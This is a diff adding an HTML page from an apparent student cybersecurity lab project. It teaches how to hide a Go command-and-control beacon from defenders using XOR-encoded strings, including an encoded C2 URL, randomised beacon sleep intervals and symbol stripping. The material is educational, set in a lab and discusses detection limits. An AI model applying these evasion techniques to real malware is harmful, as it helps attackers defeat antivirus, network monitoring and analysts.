@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Obfuscation — Phase 04</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{--bg:#0a0c10;--bg2:#111520;--bg3:#181d2b;--bgc:#0d1117;--border:#232a3e;--text:#c8cfe0;--dim:#5a6480;--head:#eef0f8;--amber:#f0a030;--red:#e03a3a;--green:#2ecc71;--blue:#4a8fff;--purple:#8b5cf6;--mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif}
+    body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.6;min-height:100vh}
+    header{border-bottom:1px solid var(--border);background:var(--bg);position:sticky;top:0;z-index:100}
+    .hi{max-width:1100px;margin:0 auto;padding:0 32px;display:flex;align-items:center;gap:32px;height:56px}
+    .logo{font-family:var(--mono);font-size:13px;color:var(--amber);font-weight:600;text-decoration:none}
+    .logo span{color:var(--dim)}
+    nav{display:flex;gap:4px}
+    nav a{font-family:var(--mono);font-size:12px;color:var(--dim);text-decoration:none;padding:6px 10px;border-radius:4px;transition:.15s}
+    nav a:hover{color:var(--text);background:var(--bg3)}
+    nav a.on{color:var(--amber);background:rgba(240,160,48,.08)}
+    .wrap{max-width:1100px;margin:0 auto;padding:56px 32px 96px;display:grid;grid-template-columns:210px 1fr;gap:48px;align-items:start}
+    .sidebar{position:sticky;top:80px}
+    .sb-label{font-family:var(--mono);font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px}
+    .sb-nav{display:flex;flex-direction:column;gap:2px}
+    .sb-nav a{font-family:var(--mono);font-size:12px;color:var(--dim);text-decoration:none;padding:6px 10px;border-radius:4px;border-left:2px solid transparent;transition:.15s}
+    .sb-nav a:hover{color:var(--text);background:var(--bg2)}
+    .sb-nav a.on{color:var(--red);border-left-color:var(--red);background:rgba(224,58,58,.07)}
+    .sb-div{border:none;border-top:1px solid var(--border);margin:12px 0}
+    .dl-btn{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--amber);text-decoration:none;padding:7px 10px;border-radius:5px;border:1px solid rgba(240,160,48,.2);background:rgba(240,160,48,.06);margin-bottom:6px;transition:.15s}
+    .dl-btn:hover{border-color:var(--amber);background:rgba(240,160,48,.12)}
+    .content{min-width:0}
+    .hero{margin-bottom:44px;border-left:3px solid var(--red);padding-left:22px}
+    .eyebrow{font-family:var(--mono);font-size:11px;color:var(--red);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px}
+    .hero h1{font-size:34px;font-weight:800;color:var(--head);line-height:1.1;margin-bottom:12px}
+    .hero p{color:var(--dim);font-family:var(--mono);font-size:13px;max-width:580px;line-height:1.7}
+    .lesson-block{margin-bottom:64px;scroll-margin-top:80px}
+    .lb-hd{display:flex;align-items:flex-start;gap:16px;margin-bottom:22px;padding-bottom:18px;border-bottom:1px solid var(--border)}
+    .lb-badge{background:rgba(224,58,58,.1);border:1px solid rgba(224,58,58,.25);color:var(--red);font-family:var(--mono);font-size:11px;font-weight:600;padding:5px 11px;border-radius:5px;white-space:nowrap;flex-shrink:0;margin-top:3px}
+    .lb-hd-text h2{font-size:22px;font-weight:800;color:var(--head);margin-bottom:4px}
+    .lb-hd-text p{font-family:var(--mono);font-size:12px;color:var(--dim);line-height:1.6}
+    .lb-status{margin-left:auto;font-family:var(--mono);font-size:11px;padding:4px 12px;border-radius:99px;font-weight:600;white-space:nowrap;flex-shrink:0}
+    .s-done{background:rgba(46,204,113,.1);color:var(--green);border:1px solid rgba(46,204,113,.2)}
+    h3{font-size:15px;font-weight:600;color:var(--head);margin:22px 0 10px}
+    p{font-size:14px;color:var(--text);line-height:1.8;margin-bottom:12px}
+    p:last-child{margin-bottom:0}
+    .code-wrap{background:var(--bgc);border:1px solid var(--border);border-radius:7px;overflow:hidden;margin:14px 0}
+    .code-bar{background:var(--bg3);border-bottom:1px solid var(--border);padding:7px 14px;display:flex;align-items:center;justify-content:space-between}
+    .code-fn{font-family:var(--mono);font-size:11px;color:var(--amber)}
+    .code-lang{font-family:var(--mono);font-size:10px;color:var(--dim);text-transform:uppercase}
+    pre{padding:18px 20px;font-family:var(--mono);font-size:12.5px;line-height:1.7;color:#abb2bf;overflow-x:auto;white-space:pre}
+    .kw{color:#c678dd}.fn{color:#61afef}.str{color:#98c379}.cm{color:#5c6370;font-style:italic}.num{color:#d19a66}.byt{color:#4a8fff}
+    .callout{border-left:3px solid var(--amber);background:rgba(240,160,48,.04);border-radius:0 6px 6px 0;padding:13px 17px;margin:14px 0;font-size:14px;line-height:1.75}
+    .callout strong{color:var(--amber)}
+    .callout.red{border-left-color:var(--red);background:rgba(224,58,58,.04)}
+    .callout.red strong{color:var(--red)}
+    .callout.blue{border-left-color:var(--blue);background:rgba(74,143,255,.04)}
+    .callout.blue strong{color:var(--blue)}
+    table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:14px 0}
+    th{background:var(--bg3);color:var(--dim);text-transform:uppercase;font-size:10px;letter-spacing:.06em;padding:9px 14px;text-align:left;border-bottom:1px solid var(--border)}
+    td{padding:9px 14px;border-bottom:1px solid var(--border);color:var(--text);vertical-align:top;line-height:1.5}
+    tr:last-child td{border-bottom:none}
+    tr:nth-child(odd) td{background:var(--bg2)}
+    .diff-add{color:var(--green);font-weight:600}
+    .diff-same{color:var(--dim)}
+    .sep{border:none;border-top:1px solid var(--border);margin:52px 0}
+    footer{border-top:1px solid var(--border);padding:24px 32px;text-align:center;font-family:var(--mono);font-size:11px;color:var(--dim)}
+    @media(max-width:768px){.wrap{grid-template-columns:1fr}.sidebar{position:static}}
+  </style>
+</head>
+<body>
+<header>
+  <div class="hi">
+    <a href="/" class="logo">recon<span>.</span>beacon</a>
+    <nav>
+      <a href="/">Home</a><a href="/lessons">Lessons</a><a href="/recon">Recon</a>
+      <a href="/c2">C2 Server</a><a href="/obfuscation" class="on">Obfuscation</a>
+      <a href="/zoo">Sample Zoo</a><a href="/defender">Blue Team</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+  <aside class="sidebar">
+    <div class="sb-label">// on this page</div>
+    <nav class="sb-nav">
+      <a href="#l07" class="on">L07 &mdash; XOR strings</a>
+      <a href="#l08">L08 &mdash; Sleep jitter</a>
+      <a href="#l09">L09 &mdash; Binary strip</a>
+    </nav>
+    <hr class="sb-div">
+    <div class="sb-label">// source files</div>
+    <a href="/payload/v4_xor.go" download class="dl-btn">&#8595; v4_xor.go</a>
+    <a href="/payload/v5_jitter.go" download class="dl-btn">&#8595; v5_jitter.go</a>
+    <hr class="sb-div">
+    <div class="sb-label">// word docs</div>
+    <a href="/download/Lesson_07_XOR_Obfuscation.docx" download class="dl-btn">&#8595; L07.docx</a>
+    <a href="/download/Lesson_08_Sleep_Jitter.docx" download class="dl-btn">&#8595; L08.docx</a>
+    <a href="/download/Lesson_09_Binary_Stripping.docx" download class="dl-btn">&#8595; L09.docx</a>
+  </aside>
+
+  <main class="content">
+    <div class="hero">
+      <div class="eyebrow">// phase 04 &mdash; obfuscation</div>
+      <h1>Making the payload harder to detect</h1>
+      <p>Three techniques applied to the v3 payload. Each one addresses a specific detection vector identified in the blue team analysis. The payload behaviour is unchanged &mdash; only what analysts can observe about it changes.</p>
+    </div>
+
+    <!-- ── L07 ──────────────────────────────────────────────────── -->
+    <div class="lesson-block" id="l07">
+      <div class="lb-hd">
+        <div class="lb-badge">L07</div>
+        <div class="lb-hd-text">
+          <h2>XOR string obfuscation</h2>
+          <p>v4_xor.go &mdash; all hardcoded strings removed from plaintext &mdash; T1027.002</p>
+        </div>
+        <span class="lb-status s-done">Complete</span>
+      </div>
+
+      <p>Version 3 has every sensitive string visible in the compiled binary. Run <code style="font-family:var(--mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:#98c379">strings.exe net_scan_v3.exe</code> and you immediately see the C2 URL, the registry path, and every command the payload runs. Any AV signature or analyst searching for <code style="font-family:var(--mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:#98c379">192.168.1.10:5000</code> finds it instantly.</p>
+      <p>XOR encoding removes these strings from the binary. Each sensitive string is pre-encoded as a byte array. At runtime the <code style="font-family:var(--mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:#98c379">decode()</code> function recovers the original string by XOR-ing each byte again with the same key. The plaintext string is never stored in the binary on disk.</p>
+
+      <h3>The decode function</h3>
+      <div class="code-wrap">
+        <div class="code-bar"><span class="code-fn">v4_xor.go</span><span class="code-lang">Go</span></div>
+        <pre><span class="kw">const</span> xorKey <span class="kw">byte</span> = <span class="num">0x5A</span>   <span class="cm">// XOR key — same value encodes and decodes</span>
+
+<span class="kw">func</span> <span class="fn">decode</span>(b []<span class="kw">byte</span>) <span class="kw">string</span> {
+    out := make([]<span class="kw">byte</span>, len(b))
+    <span class="kw">for</span> i, v := <span class="kw">range</span> b { out[i] = v ^ xorKey }
+    <span class="kw">return</span> <span class="kw">string</span>(out)
+}</pre>
+      </div>
+
+      <h3>Pre-encoded string example &mdash; the C2 URL</h3>
+      <p>The original URL (<code style="font-family:var(--mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:#98c379">http://192.168.1.10:5000/beacon</code>) does not appear anywhere in the source. Only the encoded bytes do:</p>
+      <div class="code-wrap">
+        <div class="code-bar"><span class="code-fn">v4_xor.go</span><span class="code-lang">Go</span></div>
+        <pre><span class="cm">// http://192.168.1.10:5000/beacon &mdash; encoded with key 0x5A</span>
+<span class="kw">var</span> encC2URL = []<span class="kw">byte</span>{
+    <span class="byt">0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x6b, 0x63, 0x68,</span>
+    <span class="byt">0x74, 0x6b, 0x6c, 0x62, 0x74, 0x6b, 0x74, 0x6b, 0x6a, 0x60,</span>
+    <span class="byt">0x6f, 0x6a, 0x6a, 0x6a, 0x75, 0x38, 0x3f, 0x3b, 0x39, 0x35, 0x34,</span>
+}
+
+<span class="cm">// Decoded only at runtime, immediately before use</span>
+c2URL := <span class="fn">decode</span>(encC2URL)</pre>
+      </div>
+
+      <div class="callout red">
+        <strong>Critical point.</strong> Writing <code style="font-family:var(--mono);font-size:11px;background:rgba(0,0,0,.2);padding:1px 5px;border-radius:3px">decode("http://192.168.1.10:5000/beacon")</code> does NOT work. The string literal still appears in the binary even though you decode it. The bytes must be pre-computed and written as integer arrays &mdash; no string literals for any sensitive value.
+      </div>
+
+      <h3>What changes in the binary</h3>
+      <table>
+        <thead><tr><th>String</th><th>In v3 binary?</th><th>In v4 binary?</th></tr></thead>
+        <tbody>
+          <tr><td style="font-family:var(--mono)">http://192.168.1.10:5000/beacon</td><td class="diff-same">Plaintext &#10005;</td><td class="diff-add">Gone &#10003;</td></tr>
+          <tr><td style="font-family:var(--mono)">HKCU\Software\...\Run</td><td class="diff-same">Plaintext &#10005;</td><td class="diff-add">Gone &#10003;</td></tr>
+          <tr><td style="font-family:var(--mono)">ReconBeacon</td><td class="diff-same">Plaintext &#10005;</td><td class="diff-add">Gone &#10003;</td></tr>
+          <tr><td style="font-family:var(--mono)">netstat -ano</td><td class="diff-same">Plaintext &#10005;</td><td class="diff-add">Gone &#10003;</td></tr>
+          <tr><td style="font-family:var(--mono)">tasklist /fo csv</td><td class="diff-same">Plaintext &#10005;</td><td class="diff-add">Gone &#10003;</td></tr>
+          <tr><td style="font-family:var(--mono)">recon_combined.txt</td><td class="diff-same">Plaintext &#10005;</td><td class="diff-add">Gone &#10003;</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="sep">
+
+    <!-- ── L08 ──────────────────────────────────────────────────── -->
+    <div class="lesson-block" id="l08">
+      <div class="lb-hd">
+        <div class="lb-badge">L08</div>
+        <div class="lb-hd-text">
+          <h2>Sleep jitter</h2>
+          <p>v5_jitter.go &mdash; randomised beacon interval &mdash; T1497</p>
+        </div>
+        <span class="lb-status s-done">Complete</span>
+      </div>
+
+      <p>Version 4 hides the strings but the network behaviour is still predictable. The payload beacons at exactly 60-second intervals. Network IDS tools like Zeek and Suricata have dedicated beacon detection modules that look for exactly this pattern: a fixed inter-arrival time from the same source to the same destination. The timing alone is a signature &mdash; they do not need to read the packet contents.</p>
+      <p>Jitter adds a random offset to each sleep so no two intervals are identical. The base is still 60 seconds but each cycle sleeps anywhere between 48 and 72 seconds. To a beacon detector the traffic no longer has a stable periodicity.</p>
+
+      <h3>The jitteredSleep function</h3>
+      <div class="code-wrap">
+        <div class="code-bar"><span class="code-fn">v5_jitter.go</span><span class="code-lang">Go</span></div>
+        <pre><span class="kw">func</span> <span class="fn">jitteredSleep</span>(base time.Duration, pct <span class="kw">int</span>) {
+    <span class="cm">// Maximum deviation: 20% of 60s = 12s</span>
+    delta := int64(base) * int64(pct) / <span class="num">100</span>
+
+    <span class="cm">// Random offset in range: -12s to +12s</span>
+    offset := rand.<span class="fn">Int63n</span>(delta*<span class="num">2</span>) - delta
+
+    time.<span class="fn">Sleep</span>(base + time.<span class="fn">Duration</span>(offset))
+}
+
+<span class="cm">// Usage: sleeps 48s &ndash; 72s, different every cycle</span>
+<span class="fn">jitteredSleep</span>(<span class="num">60</span>*time.Second, <span class="num">20</span>)</pre>
+      </div>
+
+      <h3>The only code change from v4</h3>
+      <div class="code-wrap">
+        <div class="code-bar"><span class="code-fn">diff: v4 &rarr; v5</span><span class="code-lang">diff</span></div>
+        <pre><span class="cm">// import block: add "math/rand"</span>
+
+<span class="cm">// Bottom of beacon loop:</span>
+<span class="str">- time.Sleep(60 * time.Second)</span>
+<span class="diff-add">+ jitteredSleep(60*time.Second, 20)</span></pre>
+      </div>
+
+      <div class="callout blue">
+        <strong>Verify jitter in Wireshark.</strong> Run v4 for 3 minutes then v5 for 3 minutes with the filter <code style="font-family:var(--mono);font-size:11px;background:rgba(0,0,0,.2);padding:1px 5px;border-radius:3px">http.request.method == "POST"</code>. The Time column shows constant 60s intervals for v4 and varying intervals for v5. Screenshot both &mdash; this is the core before/after for this lesson.
+      </div>
+
+      <h3>Effect on detection</h3>
+      <table>
+        <thead><tr><th>Detection method</th><th>v4 (fixed 60s)</th><th>v5 (jitter ±20%)</th></tr></thead>
+        <tbody>
+          <tr><td>Zeek beacon detection (timing analysis)</td><td class="diff-same">Detected &mdash; exact 60s pattern</td><td class="diff-add">Harder &mdash; no stable interval</td></tr>
+          <tr><td>Wireshark timing analysis</td><td class="diff-same">Obvious &mdash; regular POST every 60s</td><td class="diff-add">Less obvious &mdash; varying intervals</td></tr>
+          <tr><td>Sysmon EID 3 (network events)</td><td class="diff-same">Still fires every connection</td><td class="diff-same">Unchanged &mdash; jitter does not help here</td></tr>
+          <tr><td>Static analysis (strings.exe)</td><td class="diff-add">No strings visible (from L07)</td><td class="diff-add">Unchanged</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="sep">
+
+    <!-- ── L09 ──────────────────────────────────────────────────── -->
+    <div class="lesson-block" id="l09">
+      <div class="lb-hd">
+        <div class="lb-badge">L09</div>
+        <div class="lb-hd-text">
+          <h2>Binary stripping</h2>
+          <p>v5_jitter.go compiled with -ldflags="-s -w" &mdash; T1027</p>
+        </div>
+        <span class="lb-status s-done">Complete</span>
+      </div>
+
+      <p>A Go binary compiled without flags embeds the symbol table (all function names and variable names) and DWARF debugging tables (source file paths, line numbers). Load an unstripped binary in Ghidra and you can read every function name: <code style="font-family:var(--mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:#98c379">main.main</code>, <code style="font-family:var(--mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:#98c379">main.sendToC2</code>, <code style="font-family:var(--mono);font-size:12px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:#98c379">main.decode</code>. The strip flags remove all of this without changing any runtime behaviour. The source code itself does not change &mdash; stripping is applied entirely at compile time via two linker flags.</p>
+
+      <h3>What each flag removes</h3>
+      <table>
+        <thead><tr><th>Flag</th><th>Removes from binary</th><th>Effect on runtime</th></tr></thead>
+        <tbody>
+          <tr><td style="font-family:var(--mono)">-s</td><td>Symbol table &mdash; all function names, variable names, package import paths</td><td>None</td></tr>
+          <tr><td style="font-family:var(--mono)">-w</td><td>DWARF debug info &mdash; source file paths, line numbers, type info used by Ghidra and dlv</td><td>None</td></tr>
+          <tr><td style="font-family:var(--mono)">-s -w</td><td>Both together &mdash; maximum analyst visibility reduction and size reduction</td><td>None</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Build commands</h3>
+      <div class="code-wrap">
+        <div class="code-bar"><span class="code-fn">PowerShell &mdash; both builds side by side</span><span class="code-lang">shell</span></div>
+        <pre><span class="cm"># Standard build &mdash; function names visible in Ghidra (~1.8 MB)</span>
+GOOS=windows GOARCH=amd64 go build -o v5_jitter.exe v5_jitter.go
+
+<span class="cm"># Stripped build &mdash; no function names, no source paths (~1.2 MB, ~33% smaller)</span>
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o v5_final.exe v5_jitter.go
+
+<span class="cm"># Compare sizes</span>
+dir v5_jitter.exe v5_final.exe
+
+<span class="cm"># Verify strings are gone &mdash; both should return no output</span>
+strings.exe v5_final.exe | findstr "http"
+strings.exe v5_final.exe | findstr "netstat"
+strings.exe v5_final.exe | findstr "main.sendToC2"</pre>
+      </div>
+
+      <h3>What Ghidra sees &mdash; before and after stripping</h3>
+      <table>
+        <thead><tr><th>What Ghidra shows</th><th>Unstripped (v5_jitter.exe)</th><th>Stripped (v5_final.exe)</th></tr></thead>
+        <tbody>
+          <tr><td>Function names in Symbol Tree</td><td class="diff-same">main.main, main.sendToC2, main.decode, main.jitteredSleep &mdash; all readable</td><td class="diff-add">FUN_00401a20, FUN_00403b10 &mdash; generic auto-named functions only</td></tr>
+          <tr><td>Source file paths</td><td class="diff-same">C:\Users\sally\...\v5_jitter.go visible in strings</td><td class="diff-add">Removed &mdash; no build path exposed</td></tr>
+          <tr><td>Line number info</td><td class="diff-same">Present &mdash; Ghidra maps each instruction to source line</td><td class="diff-add">Removed &mdash; no source correlation possible</td></tr>
+          <tr><td>Binary size</td><td class="diff-same">~1.8 MB</td><td class="diff-add">~1.2 MB &mdash; ~33% reduction</td></tr>
+          <tr><td>Runtime behaviour</td><td class="diff-add">Identical</td><td class="diff-add">Identical</td></tr>
+        </tbody>
+      </table>
+
+      <div class="callout red">
+        <strong>Important limitation.</strong> Stripping removes debug info but the Go runtime itself stays in the binary. The <code style="font-family:var(--mono);font-size:11px;background:rgba(0,0,0,.2);padding:1px 5px;border-radius:3px">.gopclntab</code> section &mdash; which the runtime needs to handle panics and stack traces &mdash; cannot be removed with <code style="font-family:var(--mono);font-size:11px;background:rgba(0,0,0,.2);padding:1px 5px;border-radius:3px">-ldflags</code>. A Mandiant tool called <strong>GoReSym</strong> parses this section and recovers all function names from a stripped binary in under one minute. Stripping raises the cost of analysis; it does not prevent it. See the Blue Team page for the full GoReSym walkthrough.
+      </div>
+
+      <h3>Final build &mdash; all three obfuscation layers combined</h3>
+      <p>v5_jitter.go compiled with the strip flags is the most complete version produced in this project. It stacks all three Phase 04 techniques: XOR string encoding (no plaintext strings in the binary), sleep jitter (no fixed beacon interval on the network), and binary stripping (no function names in Ghidra). The source code is identical to v5_jitter.go &mdash; only the build command changes.</p>
+      <div class="code-wrap">
+        <div class="code-bar"><span class="code-fn">Final production build command</span><span class="code-lang">shell</span></div>
+        <pre>GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o v5_final.exe v5_jitter.go</pre>
+      </div>
+
+      <h3>Obfuscation layer summary &mdash; all three techniques</h3>
+      <table>
+        <thead><tr><th>Layer</th><th>Version introduced</th><th>Detection vector addressed</th><th>What it does NOT hide</th></tr></thead>
+        <tbody>
+          <tr><td>XOR string encoding</td><td>v4</td><td>strings.exe, static AV signatures, plaintext string search</td><td>Runtime behaviour, network traffic, Sysmon events</td></tr>
+          <tr><td>Sleep jitter</td><td>v5</td><td>Fixed-interval beacon detection (Zeek, Suricata)</td><td>Destination IP/port, POST method, payload content</td></tr>
+          <tr><td>Binary stripping</td><td>v5_final</td><td>Ghidra function names, DWARF debug info, source file paths</td><td>.gopclntab (GoReSym recovers names), runtime identity as Go binary</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+  </main>
+</div>
+
+<footer>Final Year Cybersecurity Project &nbsp;&middot;&nbsp; Educational use only &nbsp;&middot;&nbsp; Lab environment</footer>
+
+<script>
+  const ss=document.querySelectorAll('.lesson-block'),ls=document.querySelectorAll('.sb-nav a');
+  ss.forEach(s=>new IntersectionObserver(e=>{e.forEach(n=>{if(n.isIntersecting){ls.forEach(l=>l.classList.remove('on'));const a=document.querySelector('.sb-nav a[href="#'+n.target.id+'"]');if(a)a.classList.add('on')}})},{rootMargin:'-40% 0px -55% 0px'}).observe(s));
+</script>
+</body>
+</html>
